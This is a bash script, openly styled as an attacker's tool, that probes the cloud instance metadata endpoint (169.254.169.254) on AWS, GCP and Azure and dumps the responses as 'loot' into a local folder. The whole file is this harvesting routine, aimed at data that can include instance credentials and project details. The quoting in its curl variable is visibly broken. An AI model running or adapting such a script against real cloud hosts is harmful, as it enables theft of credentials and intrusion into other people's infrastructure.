#!/bin/bash
# metadata mining for cloud creeps

USER_AGENT="deepthroat/1.0"
OUT_DIR="./cloud_loot"
mkdir -p "$OUT_DIR"

CURL="curl -s -H 'User-Agent: $USER_AGENT' --max-time 3"

echo "[*] Starting deep inspection of cloud internals..."

######################
# AWS Metadata Grabber
######################
aws_snatch() {
    echo "[*] Checking AWS metadata..."
    META_URL="http://169.254.169.254/latest/meta-data/"
    TEST=$($CURL "$META_URL")
    if [[ $TEST == *"ami-id"* ]]; then
        echo "[+] AWS detected. Harvesting..."
        $CURL "$META_URL" | while read -r item; do
            echo "[*] Looting $item"
            $CURL "${META_URL}${item}" >> "$OUT_DIR/aws_${item//\//_}.txt" 2>/dev/null
        done
        echo "[+] AWS metadata loot saved in $OUT_DIR"
    fi
}

######################
# GCP Metadata Grabber
######################
gcp_snatch() {
    echo "[*] Checking GCP metadata..."
    META_URL="http://169.254.169.254/computeMetadata/v1/"
    HEADERS="Metadata-Flavor: Google"
    TEST=$(curl -s -H "$HEADERS" "$META_URL")
    if [[ $TEST == *"instance/"* ]]; then
        echo "[+] GCP detected. Harvesting..."
        for path in instance/ project/; do
            curl -s -H "$HEADERS" "$META_URL$path" --max-time 3 >> "$OUT_DIR/gcp_${path//\//_}.txt" 2>/dev/null
        done
        echo "[+] GCP metadata loot saved in $OUT_DIR"
    fi
}

######################
# Azure Metadata Grabber
######################
azure_snatch() {
    echo "[*] Checking Azure metadata..."
    META_URL="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    TEST=$(curl -s -H "Metadata:true" "$META_URL")
    if [[ $TEST == *"compute"* ]]; then
        echo "[+] Azure detected. Harvesting..."
        echo "$TEST" > "$OUT_DIR/azure_metadata.json"
        echo "[+] Azure metadata loot saved in $OUT_DIR"
    fi
}

######################
# Main execution
######################
aws_snatch
gcp_snatch
azure_snatch

echo "[*] deepthroat.sh finished. Check $OUT_DIR for messy cleanup."
